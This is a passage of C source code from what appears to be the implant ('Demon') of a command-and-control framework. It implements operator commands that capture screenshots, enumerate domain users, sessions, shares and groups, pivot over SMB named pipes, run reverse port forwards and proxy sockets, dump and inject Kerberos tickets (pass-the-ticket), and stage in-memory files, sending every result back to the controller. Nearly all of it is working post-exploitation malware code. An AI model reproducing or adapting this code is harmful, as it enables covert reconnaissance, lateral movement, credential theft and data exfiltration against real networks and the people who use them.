            Instance.Config.Transport.WorkingHours = ParserGetInt32( Parser );

            PRINTF( "Instance.Config.Transport.WorkingHours => %d\n", Instance.Config.Transport.WorkingHours );
            PackageAddInt32( Package, Instance.Config.Transport.WorkingHours );

            break;
        }

        default:
            PackageAddInt32( Package, 0 );
            break;
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandScreenshot( PPARSER Parser )
{
    PUTS( "Screenshot" )
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_SCREENSHOT );
    PVOID    Image   = NULL;
    SIZE_T   Size    = 0;

    if ( WinScreenshot( &Image, &Size ) )
    {
        PUTS( "Successful took screenshot" )
        PackageAddInt32( Package, TRUE );
        PackageAddBytes( Package, Image, Size );
    }
    else
    {
        PUTS( "Failed to take screenshot" )
        PackageAddInt32( Package, FALSE );
    }

    PackageTransmit( Package, NULL, 0 );
}

// TODO: The Net module is unstable so fix those issues to work on normal workstation and domain server
VOID CommandNet( PPARSER Parser )
{
    PUTS( "NET COMMAND" )
    PPACKAGE Package    = PackageCreate( DEMON_COMMAND_NET );
    UINT32   NetCommand = ParserGetInt32( Parser );

    PackageAddInt32( Package, NetCommand );

    switch ( NetCommand )
    {
        case DEMON_NET_COMMAND_DOMAIN:
        {
            PUTS( "DEMON_NET_COMMAND_DOMAIN" )

            LPSTR Domain = NULL;
            DWORD Length = 0;

            if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
            {
                if ( ( Domain = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
                {
                    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Domain, &Length ) )
                    {
                        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                        PackageDestroy( Package );
                    }
                }
            }

            PackageAddString( Package, Domain );

            if ( Domain )
            {
                MemSet( Domain, 0, Length );
                Instance.Win32.LocalFree( Domain );
            }

            break;
        }

        case DEMON_NET_COMMAND_LOGONS:
        {
            PUTS( "DEMON_NET_COMMAND_LOGONS" )

            LPWKSTA_USER_INFO_0 UserInfo        = NULL;
            DWORD               dwLevel         = 0;
            DWORD               dwEntriesRead   = 0;
            DWORD               dwTotalEntries  = 0;
            DWORD               dwResumeHandle  = 0;
            DWORD               NetStatus       = 0;
            UINT32              UserNameSize    = 0;
            LPWSTR              ServerName      = NULL;

            ServerName = ParserGetWString( Parser, &UserNameSize );

            PackageAddWString( Package, ServerName );

            UserNameSize = 0;
            do
            {
                NetStatus = Instance.Win32.NetWkstaUserEnum( ServerName, dwLevel, (LPBYTE*)&UserInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle );
                if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
                {
                    for ( INT i = 0; ( i < dwEntriesRead ); i++ )
                    {
                        if ( UserInfo == NULL )
                            break;

                        PackageAddWString( Package, UserInfo[i].wkui0_username );
                    }
                }
                else
                {
                    NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NetStatus ) );

                    PRINTF( "NetWkstaUserEnum: Failed [%d]\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto CLEANUP;
                }

                if ( UserInfo )
                {
                    Instance.Win32.NetApiBufferFree( UserInfo );
                    UserInfo = NULL;
                }
            }
            while ( NetStatus == ERROR_MORE_DATA );

            if ( UserInfo != NULL )
                Instance.Win32.NetApiBufferFree( UserInfo );

            break;

        CLEANUP:
            if ( UserInfo != NULL )
                Instance.Win32.NetApiBufferFree( UserInfo );

            PackageDestroy( Package );
            return;
        }

        case DEMON_NET_COMMAND_SESSIONS:
        {
            PUTS( "DEMON_NET_COMMAND_SESSIONS" )

            LPSESSION_INFO_10 SessionInfo       = NULL;
            DWORD             EntriesRead       = 0;
            DWORD             TotalEntries      = 0;
            DWORD             ResumeHandle      = 0;
            LPWSTR            ServerName        = NULL;
            DWORD             NetStatus         = 0;
            UINT32            UserNameSize      = 0;

            ServerName = ParserGetWString( Parser, &UserNameSize );

            PackageAddWString( Package, ServerName );

            UserNameSize = 0;
            do
            {
                NetStatus = Instance.Win32.NetSessionEnum( ServerName, NULL, NULL, 10, (LPBYTE*)&SessionInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &ResumeHandle );

                if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
                {
                    for ( INT i = 0; i < EntriesRead ; i++ )
                    {
                        if ( SessionInfo == NULL )
                            break;

                        PackageAddWString( Package, SessionInfo[i].sesi10_username );
                        PackageAddWString( Package, SessionInfo[i].sesi10_username );
                        PackageAddInt32( Package, SessionInfo[i].sesi10_time );
                        PackageAddInt32( Package, SessionInfo[i].sesi10_idle_time );
                    }
                }
                else
                {
                    PRINTF( "NetSessionEnum: Failed [%d]\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto SESSION_CLEANUP;
                }

                if ( SessionInfo != NULL )
                {
                    Instance.Win32.NetApiBufferFree( SessionInfo );
                    SessionInfo = NULL;
                }
            }
            while ( NetStatus == ERROR_MORE_DATA );

            if ( SessionInfo )
                Instance.Win32.NetApiBufferFree( SessionInfo );

            break;

        SESSION_CLEANUP:
            if ( SessionInfo != NULL )
                Instance.Win32.NetApiBufferFree( SessionInfo );

            PackageDestroy( Package );
            return;
        }

        case DEMON_NET_COMMAND_COMPUTER:
        {
            PUTS( "DEMON_NET_COMMAND_COMPUTER" )

            break;
        }

        case DEMON_NET_COMMAND_DCLIST:
        {
            PUTS( "DEMON_NET_COMMAND_DCLIST" )
            break;
        }

        case DEMON_NET_COMMAND_SHARE:
        {
            PUTS( "DEMON_NET_COMMAND_SHARE" )

            PSHARE_INFO_502 ShareInfo    = NULL;
            DWORD           NetStatus    = 0;
            DWORD           Entries      = 0;
            DWORD           TotalEntries = 0;
            DWORD           Resume       = 0;
            LPWSTR          ServerName   = NULL;
            UINT32          ServerSize   = 0;

            ServerName = ParserGetWString( Parser, &ServerSize );
            PackageAddWString( Package, ServerName );
            do
            {
                NetStatus = Instance.Win32.NetShareEnum( ServerName, 502, (LPBYTE*)&ShareInfo, MAX_PREFERRED_LENGTH, &Entries, &TotalEntries, &Resume );
                if( ( NetStatus == ERROR_SUCCESS ) || ( NetStatus == ERROR_MORE_DATA ) )
                {

                    for( DWORD i = 0; i < Entries; i++ )
                    {
                        PRINTF( "%-5ls %-20ls %d %-20ls\n", ShareInfo[i].shi502_netname, ShareInfo[i].shi502_path, ShareInfo[i].shi502_permissions, ShareInfo[i].shi502_remark );

                        PackageAddWString( Package, ShareInfo[i].shi502_netname );
                        PackageAddWString( Package, ShareInfo[i].shi502_path );
                        PackageAddWString( Package, ShareInfo[i].shi502_remark );
                        PackageAddInt32( Package, ShareInfo[i].shi502_permissions );
                    }

                    Instance.Win32.NetApiBufferFree( ShareInfo );
                    ShareInfo = NULL;
                }
                else
                    PRINTF( "Error: %ld\n", NetStatus );
            }
            while ( NetStatus == ERROR_MORE_DATA );

            break;
        }

        case DEMON_NET_COMMAND_LOCALGROUP:
        {
            PUTS( "DEMON_NET_COMMAND_LOCALGROUP" )

            PLOCALGROUP_INFO_1  GroupInfo     = NULL;
            DWORD               EntriesRead   = 0;
            DWORD               TotalEntries  = 0;
            DWORD               NetStatus     = 0;
            LPWSTR              ServerName    = NULL;
            UINT32              ServerSize    = 0;

            ServerName = ParserGetWString( Parser, &ServerSize );
            PackageAddWString( Package, ServerName );

            PRINTF( "ServerName => %ls\n", ServerName );

            NetStatus = Instance.Win32.NetLocalGroupEnum( ServerName, 1, (LPBYTE*)&GroupInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, NULL );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                PUTS( "NetLocalGroupEnum => Success" )
                if ( GroupInfo )
                {
                    for( DWORD i = 0; i < EntriesRead; i++ )
                    {
                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_name );
                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_comment );
                    }

                    Instance.Win32.NetApiBufferFree( GroupInfo );
                    GroupInfo = NULL;
                }
            }

            break;
        }

        case DEMON_NET_COMMAND_GROUP:
        {
            PUTS( "DEMON_NET_COMMAND_GROUP" )

            PLOCALGROUP_INFO_1  GroupInfo     = NULL;
            DWORD               EntriesRead   = 0;
            DWORD               TotalEntries  = 0;
            DWORD               NetStatus     = 0;
            LPWSTR              ServerName    = NULL;
            UINT32              ServerSize    = 0;

            ServerName = ParserGetWString( Parser, &ServerSize );
            PackageAddWString( Package, ServerName );

            NetStatus = Instance.Win32.NetGroupEnum( ServerName, 1, (LPBYTE*)&GroupInfo, -1, &EntriesRead, &TotalEntries, NULL );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                if ( GroupInfo )
                {
                    for( DWORD i = 0;i < EntriesRead; i++ )
                    {
                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_name );
                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_comment );
                    }
                }

                Instance.Win32.NetApiBufferFree( GroupInfo );
                GroupInfo = NULL;
            }
            else
            {
                PRINTF( "NetGroupEnum: Failed [%d : %d]\n", NtGetLastError(), NetStatus );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            }

            if ( GroupInfo )
            {
                Instance.Win32.NetApiBufferFree( GroupInfo );
                GroupInfo = NULL;
            }

            break;
        }

        case DEMON_NET_COMMAND_USER:
        {
            PUTS( "DEMON_NET_COMMAND_USER" )

            LPUSER_INFO_0  UserInfo     = NULL;
            DWORD          NetStatus    = 0;
            DWORD          EntriesRead  = 0;
            DWORD          TotalEntries = 0;
            DWORD          Resume       = 0;
            LPWSTR         ServerName   = NULL;
            UINT32         ServerSize   = 0;

            ServerName = ParserGetWString( Parser, &ServerSize );
            PackageAddWString( Package, ServerName );

            NetStatus = Instance.Win32.NetUserEnum( ServerName, 0, 0, (LPBYTE*)&UserInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &Resume );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                for ( DWORD i = 0; i < EntriesRead; i++ )
                {
                    if ( UserInfo[ i ].usri0_name )
                    {
                        PackageAddWString( Package, UserInfo[ i ].usri0_name );
                        PackageAddInt32( Package, FALSE ); // TODO: fix this.
                    }
                }

                if ( UserInfo )
                {
                    Instance.Win32.NetApiBufferFree( UserInfo );
                    UserInfo = NULL;
                }
            }
            else
            {
                PRINTF( "NetGroupEnum: Failed [%d : %d]\n", NtGetLastError(), NetStatus );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            }

            break;
        }

        default:
        {
            PUTS( "COMMAND NOT FOUND" )
            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandPivot( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_PIVOT );
    DWORD    Pivot   = ParserGetInt32( Parser );

    PackageAddInt32( Package, Pivot );

    PRINTF( "Pivot => %d\n", Pivot );

    switch ( Pivot )
    {
        case DEMON_PIVOT_LIST:
        {
            PUTS( "DEMON_PIVOT_LIST" )
            PPIVOT_DATA TempList = Instance.SmbPivots;

            do
            {
                if ( TempList )
                {
                    PRINTF( "Pivot List => DemonId:[%x] Named Pipe:[%ls]\n", TempList->DemonID, TempList->PipeName.Buffer )

                    PackageAddInt32( Package, TempList->DemonID );
                    PackageAddWString( Package, TempList->PipeName.Buffer );

                    TempList = TempList->Next;
                } else break;
            }
            while ( TRUE );

            break;
        }

        case DEMON_PIVOT_SMB_CONNECT:
        {
            PUTS( "DEMON_PIVOT_SMB_CONNECT" )

            DWORD  BytesSize = 0;
            PVOID  Output    = NULL;
            BUFFER PipeName  = { 0 };

            PipeName.Buffer = ParserGetBytes( Parser, &PipeName.Length );

            if ( PivotAdd( PipeName, &Output, &BytesSize ) )
            {
                PRINTF( "Successful connected: %x : %d\n", Output, BytesSize )

                PackageAddInt32( Package, TRUE );
                PackageAddBytes( Package, Output, BytesSize );

                MemSet( Output, 0, BytesSize );
                Instance.Win32.LocalFree( Output );
                Output = NULL;

#ifdef DEBUG
                PPIVOT_DATA TempList = Instance.SmbPivots;

                printf( "Smb Pivots : [ " );
                do {
                    if ( TempList )
                    {
                        printf( "%x ", TempList->DemonID );
                        TempList = TempList->Next;
                    } else
                        break;
                } while ( TRUE );
                puts( "]" );
#endif
            }
            else
            {
                PUTS( "Failed to connect" )
                PackageAddInt32( Package, FALSE );
                PackageAddInt32( Package, NtGetLastError() );
            }

            break;
        }

        case DEMON_PIVOT_SMB_DISCONNECT:
        {
            DWORD AgentID = ParserGetInt32( Parser );
            DWORD Success = FALSE;

            Success = PivotRemove( AgentID );

            PackageAddInt32( Package, Success );
            PackageAddInt32( Package, AgentID );

            break;
        }

        case DEMON_PIVOT_SMB_COMMAND:
        {
            PUTS( "DEMON_PIVOT_SMB_COMMAND" )

            UINT32      DemonId   = ParserGetInt32( Parser );
            BUFFER      Data      = { 0 };
            PPIVOT_DATA TempList  = Instance.SmbPivots;
            PPIVOT_DATA PivotData = NULL;
            Data.Buffer           = ParserGetBytes( Parser, &Data.Length );

            if ( ! Data.Buffer || ! Data.Length )
            {
                PUTS( "Can't send empty data to pivot" )
                return;
            }

            do
            {
                if ( TempList ) {
                    // if the specified demon was found break the loop
                    if ( TempList->DemonID == DemonId ) {
                        PivotData = TempList;
                        break;
                    }
                    // select the next pivot
                    TempList = TempList->Next;
                } else break;
            } while ( TRUE );

            if ( PivotData )
            {
                if ( ! PipeWrite( PivotData->Handle, &Data ) )
                {
                    PUTS( "PipeWrite failed" )
                    CALLBACK_GETLASTERROR
                }
                else
                    PRINTF( "Successfully wrote 0x%x bytes of data to demon %x\n", Data.Length, DemonId )
            } else PRINTF( "Didn't found demon pivot %x\n", DemonId )

            // DEMON_PIVOT_SMB_COMMAND does not send any response
            // TODO: send confirmation that it worked?
            //       this message colides with PivotPush
            return;
        }

        default: break;
    }

    PUTS( "Pivot transport" )
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandTransfer( PPARSER Parser )
{
    DWORD          Command  = 0;
    PPACKAGE       Package  = NULL;
    PDOWNLOAD_DATA Download = NULL;
    DWORD          FileID   = 0;
    BOOL           Found    = 0;

    Package  = PackageCreate( DEMON_COMMAND_TRANSFER );
    Command  = ParserGetInt32( Parser );
    Download = Instance.Downloads;

    PackageAddInt32( Package, Command );

    switch ( Command )
    {
        case DEMON_COMMAND_TRANSFER_LIST: PUTS( "Transfer::list" )
        {
            for ( ;; )
            {
                if ( ! Download )
                    break;

                /* Add download data */
                PackageAddInt32( Package, Download->FileID   );
                PackageAddInt32( Package, Download->ReadSize );
                PackageAddInt32( Package, Download->State    );

                Download = Download->Next;
            }
            break;
        }

        case DEMON_COMMAND_TRANSFER_STOP: PUTS( "Transfer::stop" )
        {
            FileID = ParserGetInt32( Parser );

            for ( ;; )
            {
                if ( ! Download )
                    break;

                if ( Download->FileID == FileID )
                {
                    Download->State = DOWNLOAD_STATE_STOPPED;
                    Found           = TRUE;

                    PRINTF( "Found download (%x) and stopped it.\n", Download->FileID )
                    break;
                }

                Download = Download->Next;
            }

            PackageAddInt32( Package, Found  );
            PackageAddInt32( Package, FileID );

            break;
        }

        case DEMON_COMMAND_TRANSFER_RESUME: PUTS( "Transfer::resume" )
        {
            FileID = ParserGetInt32( Parser );

            for ( ;; )
            {
                if ( ! Download )
                    break;

                if ( Download->FileID == FileID )
                {
                    Download->State = DOWNLOAD_STATE_RUNNING;
                    Found           = TRUE;

                    PRINTF( "Found download (%x) and stopped it.\n", Download->FileID )
                    break;
                }

                Download = Download->Next;
            }

            /* Tell us if we managed to find and resume the download */
            PackageAddInt32( Package, Found  );
            PackageAddInt32( Package, FileID );

            break;
        }

        case DEMON_COMMAND_TRANSFER_REMOVE: PUTS( "Transfer::remove" )
        {
            FileID = ParserGetInt32( Parser );

            for ( ;; )
            {
                if ( ! Download )
                    break;

                if ( Download->FileID == FileID )
                {
                    Download->State = DOWNLOAD_STATE_REMOVE;
                    Found           = TRUE;

                    PRINTF( "Found download (%x) and stopped it.\n", Download->FileID )
                    break;
                }

                Download = Download->Next;
            }

            /* Tell us if we managed to find and resume the download */
            PackageAddInt32( Package, Found  );
            PackageAddInt32( Package, FileID );

            /* Tell the server to close the file. Only if we found the download */
            if ( Found )
            {
                PPACKAGE Package2 = PackageCreate( DEMON_COMMAND_TRANSFER );
                PackageAddInt32( Package2, Command );
                PackageAddInt32( Package2, FileID );
                PackageAddInt32( Package2, DOWNLOAD_REASON_REMOVED );
                PackageTransmit( Package2, NULL, NULL );
                Package2 = NULL;
            }

            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandSocket( PPARSER Parser )
{
    PPACKAGE     Package = NULL;
    PSOCKET_DATA Socket  = NULL;
    DWORD        Command = 0;

    Package = PackageCreate( DEMON_COMMAND_SOCKET );
    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );
    switch ( Command )
    {
        case SOCKET_COMMAND_RPORTFWD_ADD: PUTS( "Socket::RPortFwdAdd" )
        {
            DWORD LclAddr = 0;
            DWORD LclPort = 0;
            DWORD FwdAddr = 0;
            DWORD FwdPort = 0;

            // TODO: add support for IPv6

            /* Parse Host and Port to bind to */
            LclAddr = ParserGetInt32( Parser );
            LclPort = ParserGetInt32( Parser );

            /* Parse Host and Port to forward port to */
            FwdAddr = ParserGetInt32( Parser );
            FwdPort = ParserGetInt32( Parser );

            /* Create a reverse port forward socket and insert it into the linked list. */
            Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PORTFWD, LclAddr, NULL, LclPort, FwdAddr, FwdPort );

            /* if Socket is not NULL then we managed to start a socket. */
            PackageAddInt32( Package, Socket ? TRUE : FALSE );
            PackageAddInt32( Package, Socket ? Socket->ID : 0 );

            /* Add our Bind Host & Port data */
            PackageAddInt32( Package, LclAddr );
            PackageAddInt32( Package, LclPort );

            /* Add our Forward Host & Port data */
            PackageAddInt32( Package, FwdAddr );
            PackageAddInt32( Package, FwdPort );

            break;
        }

        case SOCKET_COMMAND_RPORTFWD_LIST: PUTS( "Socket::RPortFwdList" )
        {
            Socket = Instance.Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
                {
                    PackageAddInt32( Package, Socket->ID );

                    /* Add our Bind Host & Port data */
                    PackageAddInt32( Package, Socket->IPv4 );
                    PackageAddInt32( Package, Socket->LclPort );

                    /* Add our Forward Host & Port data */
                    PackageAddInt32( Package, Socket->FwdAddr );
                    PackageAddInt32( Package, Socket->FwdPort );
                }

                Socket = Socket->Next;
            }

            break;
        }

        case SOCKET_COMMAND_RPORTFWD_REMOVE: PUTS( "Socket::RPortFwdRemove" )
        {
            DWORD SocketID = 0;

            SocketID = ParserGetInt32( Parser );
            Socket   = Instance.Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD && Socket->ID == SocketID )
                {
                    Socket->Type = SOCKET_TYPE_CLIENT_REMOVED;

                    /* we don't want to send the message now.
                     * send it while we are free and closing the socket. */
                    PackageDestroy( Package );
                    Package = NULL;

                    break;
                }

                Socket = Socket->Next;
            }

            break;
        }

        case SOCKET_COMMAND_RPORTFWD_CLEAR: PUTS( "Socket::RPortFwdClear" )
        {
            Socket = Instance.Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
                    Socket->Type = SOCKET_TYPE_CLIENT_REMOVED;

                Socket = Socket->Next;
            }

            /* we don't want to send the message now.
             * send it while we are free and closing the sockets. */
            PackageDestroy( Package );
            Package = NULL;

            break;
        }

        case SOCKET_COMMAND_SOCKSPROXY_ADD: PUTS( "Socket::SocksProxyAdd" )
        {
            /* TODO: implement */

            break;
        }

        case SOCKET_COMMAND_READ_WRITE: PUTS( "Socket::Write" )
        {
            DWORD  SocketID = 0;
            BUFFER Data     = { 0 };

            /* Parse arguments */
            SocketID    = ParserGetInt32( Parser );
            Data.Buffer = ParserGetBytes( Parser, &Data.Length );

            PRINTF( "Socket ID: %x\n", SocketID )
            PRINTF( "Data[%d]: %p\n", Data.Length, Data.Buffer )

            /* get Sockets list */
            Socket = Instance.Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->ID == SocketID )
                {
                    PRINTF( "Found socket: %x\n", Socket->ID )

                    /* write the data to the socket */
                    if ( Instance.Win32.send( Socket->Socket, Data.Buffer, Data.Length, 0 ) == SOCKET_ERROR )
                        PUTS( "send failed" );

                    /* destroy the package and exit this command function */
                    PackageDestroy( Package );

                    return;
                }

                Socket = Socket->Next;
            }

            break;
        }

        case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
        {
            DWORD  ScId       = 0;
            BYTE   ATYP       = 0;
            UINT32 HostIpSize = 0;
            PBYTE  HostIp     = NULL;
            DWORD  IPv4       = 0;
            PBYTE  IPv6       = NULL;
            INT16  Port       = 0;
            LPSTR  Domain     = NULL;

            /* parse arguments */
            ScId   = ParserGetInt32( Parser );
            ATYP   = ParserGetByte( Parser );
            HostIp = ParserGetBytes( Parser, &HostIpSize );
            Port   = ParserGetInt16( Parser );

            if ( ATYP == 1 )
            {
                // IPv4
                IPv4  = 0;
                IPv4 |= ( HostIp[0] << ( 8 * 0 ));
                IPv4 |= ( HostIp[1] << ( 8 * 1 ));
                IPv4 |= ( HostIp[2] << ( 8 * 2 ));
                IPv4 |= ( HostIp[3] << ( 8 * 3 ));
            }
            else if ( ATYP == 3 )
            {
                // DOMAINNAME

                // make sure there is a nullbyte at the end of the domain
                Domain = Instance.Win32.LocalAlloc( LPTR, HostIpSize + 1 );
                MemCopy( Domain, HostIp, HostIpSize );

                IPv4 = DnsQueryIPv4( (LPSTR)Domain );

                // if the domain does not have an IPv4, try with IPv6
                if ( ! IPv4 )
                {
                    IPv6 = DnsQueryIPv6( (LPSTR)Domain );
                    if ( ! IPv6 )
                    {
                        PRINTF( "Could not resolve domain: %s\n", Domain );
                    }
                }

                Instance.Win32.LocalFree( Domain );
            }
            else if ( ATYP == 4 )
            {
                // IPv6
                IPv6 = Instance.Win32.LocalAlloc( LPTR, 16 );
                MemCopy( IPv6, HostIp, 16 );
            }

            PRINTF( "Socket ID: %x\n", ScId )

            /* check if address is not 0 */
            if ( IPv4 || IPv6 )
            {
                /* Create a socks proxy socket and insert it into the linked list. */
                if ( ( Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PROXY, IPv4, IPv6, Port, 0, 0 ) ) )
                    Socket->ID = ScId;

                PackageAddInt32( Package, Socket ? TRUE : FALSE );
            }
            else PackageAddInt32( Package, FALSE );

            PackageAddInt32( Package, ScId );
            PackageAddInt32( Package, NtGetLastError() );

            if ( IPv6 )
            {
                Instance.Win32.LocalFree( IPv6 );
                IPv6 = NULL;
            }

            break;
        }

        case SOCKET_COMMAND_CLOSE: PUTS( "Socket::Close" )
        {
            DWORD SocketID = 0;

            /* parse arguments */
            SocketID = ParserGetInt32( Parser );

            PRINTF( "SocketID: %x\n", SocketID );

            /* get Sockets list */
            Socket = Instance.Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->ID == SocketID )
                {
                    PRINTF( "Found socket: %x\n", Socket->ID )

                    Socket->Type = ( Socket->Type == SOCKET_TYPE_CLIENT ) ?
                                   SOCKET_TYPE_CLIENT_REMOVED :
                                   SOCKET_TYPE_SOCKS_REMOVED  ;

                    break;
                }

                Socket = Socket->Next;
            }

            /* destroy the package and exit this command function */
            PackageDestroy( Package );

            return;
        }

        default: break;
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID Commandkerberos( PPARSER Parser )
{
    PPACKAGE     Package = NULL;
    DWORD        Command = 0;
    HANDLE       hToken  = TokenCurrentHandle();

    Package = PackageCreate( DEMON_COMMAND_KERBEROS );
    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );
    switch ( Command )
    {
        case KERBEROS_COMMAND_LUID: PUTS("Kerberos::LUID")
        {
            LUID*  luid    = NULL;

            luid = GetLUID( hToken );

            if ( hToken )
            {
                Instance.Win32.NtClose( hToken );
                hToken = NULL;
            }

            PackageAddInt32( Package, luid ? TRUE : FALSE );

            if ( luid )
            {
                PackageAddInt32( Package, luid->HighPart );
                PackageAddInt32( Package, luid->LowPart );

                MemSet( luid, 0, sizeof( LUID ) );
                Instance.Win32.LocalFree( luid );
                luid = NULL;
            }

            break;
        }

        case KERBEROS_COMMAND_KLIST: PUTS("Kerberos::Klist")
        {
            DWORD Type                       = 0;
            PSESSION_INFORMATION Sessions    = NULL;
            PSESSION_INFORMATION SessionTmp  = NULL;
            DWORD                NumSessions = 0;
            LUID                 luid        = (LUID){.HighPart = 0, .LowPart = 0};
            DWORD                NumTickets  = 0;
            PTICKET_INFORMATION  TicketTmp   = NULL;

            Type = ParserGetInt32( Parser );
            // Type 0: /all
            // Type 1: /luid 0xabc
            if ( Type == 1 )
            {
                luid.LowPart = ParserGetInt32( Parser );
            }

            Sessions = Klist( hToken, luid );

            PackageAddInt32( Package, Sessions ? TRUE : FALSE );

            for ( NumSessions = 0, SessionTmp = Sessions; SessionTmp; NumSessions++, SessionTmp = SessionTmp->Next ){}

            PackageAddInt32( Package, NumSessions );

            while ( Sessions )
            {
                SessionTmp = Sessions->Next;

                PackageAddWString( Package, Sessions->UserName );
                PackageAddWString( Package, Sessions->Domain );
                PackageAddInt32( Package, Sessions->LogonId.LowPart );
                PackageAddInt32( Package, Sessions->LogonId.HighPart );
                PackageAddInt32( Package, Sessions->Session );
                PackageAddWString( Package, Sessions->UserSID );
                PackageAddInt32( Package, Sessions->LogonTime.LowPart );
                PackageAddInt32( Package, Sessions->LogonTime.HighPart );
                PackageAddInt32( Package, Sessions->LogonType );
                PackageAddWString( Package, Sessions->AuthenticationPackage );
                PackageAddWString( Package, Sessions->LogonServer );
                PackageAddWString( Package, Sessions->LogonServerDNSDomain );
                PackageAddWString( Package, Sessions->Upn );

                for ( NumTickets = 0, TicketTmp = Sessions->Tickets; TicketTmp; NumTickets++, TicketTmp = TicketTmp->Next ){}

                PackageAddInt32( Package, NumTickets );

                while ( Sessions->Tickets )
                {
                    TicketTmp = Sessions->Tickets->Next;

                    PackageAddWString( Package, Sessions->Tickets->ClientName );
                    PackageAddWString( Package, Sessions->Tickets->ClientRealm );
                    PackageAddWString( Package, Sessions->Tickets->ServerName );
                    PackageAddWString( Package, Sessions->Tickets->ServerRealm );
                    PackageAddInt32( Package, Sessions->Tickets->StartTime.LowPart );
                    PackageAddInt32( Package, Sessions->Tickets->StartTime.HighPart );
                    PackageAddInt32( Package, Sessions->Tickets->EndTime.LowPart );
                    PackageAddInt32( Package, Sessions->Tickets->EndTime.HighPart );
                    PackageAddInt32( Package, Sessions->Tickets->RenewTime.LowPart );
                    PackageAddInt32( Package, Sessions->Tickets->RenewTime.HighPart );
                    PackageAddInt32( Package, Sessions->Tickets->EncryptionType );
                    PackageAddInt32( Package, Sessions->Tickets->TicketFlags );
                    PackageAddBytes( Package, Sessions->Tickets->Ticket.Buffer, Sessions->Tickets->Ticket.Length );

                    if ( Sessions->Tickets->Ticket.Buffer )
                    {
                        DATA_FREE( Sessions->Tickets->Ticket.Buffer, Sessions->Tickets->Ticket.Length );
                    }

                    DATA_FREE( Sessions->Tickets, sizeof( TICKET_INFORMATION ) );
                    Sessions->Tickets = TicketTmp;
                }

                DATA_FREE( Sessions, sizeof( SESSION_INFORMATION ) );
                Sessions = SessionTmp;
            }

            if ( hToken )
            {
                Instance.Win32.NtClose( hToken );
                hToken = NULL;
            }

            break;
        }

        case KERBEROS_COMMAND_PURGE: PUTS("Kerberos::Purge")
        {
            LUID luid = (LUID){.HighPart = 0, .LowPart = 0};

            luid.LowPart = ParserGetInt32( Parser );

            PackageAddInt32( Package, Purge( hToken, luid ) ? TRUE : FALSE );

            break;
        }

        case KERBEROS_COMMAND_PTT: PUTS("Kerberos::Ptt")
        {
            PBYTE  Ticket     = NULL;
            UINT32 TicketSize = 0;
            LUID   luid       = (LUID){.HighPart = 0, .LowPart = 0};

            Ticket = ParserGetBytes( Parser, &TicketSize );

            luid.LowPart = ParserGetInt32( Parser );

            PackageAddInt32( Package, Ptt( hToken, Ticket, TicketSize, luid ) ? TRUE : FALSE );

            break;
        }

        default: break;
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandMemFile( PPARSER Parser )
{
    PPACKAGE   Package = NULL;
    ULONG32    ID      = 0;
    BUFFER     Data    = { 0 };
    SIZE_T     Size    = 0;
    PMEM_FILE  MemFile = NULL;

    Package = PackageCreate( DEMON_COMMAND_MEM_FILE );

    PUTS("MemFile")

    ID          = ParserGetInt32( Parser );
    Size        = ParserGetInt64( Parser );
    Data.Buffer = ParserGetBytes( Parser, &Data.Length );

    // TODO: handle out of order packets?

    MemFile = ProcessMemFileChunk( ID, Size, Data.Buffer, Data.Length );

    PackageAddInt32( Package, ID );
    PackageAddInt32( Package, MemFile != NULL ? TRUE : FALSE );

    PackageTransmit( Package, NULL, NULL );
}

BOOL InWorkingHours( )
{
    SYSTEMTIME SystemTime   = { 0 };
    UINT32     WorkingHours = Instance.Config.Transport.WorkingHours;
    WORD       StartHour    = 0;
    WORD       StartMinute  = 0;
    WORD       EndHour      = 0;
    WORD       EndMinute    = 0;

    // if WorkingHours is not set, return TRUE
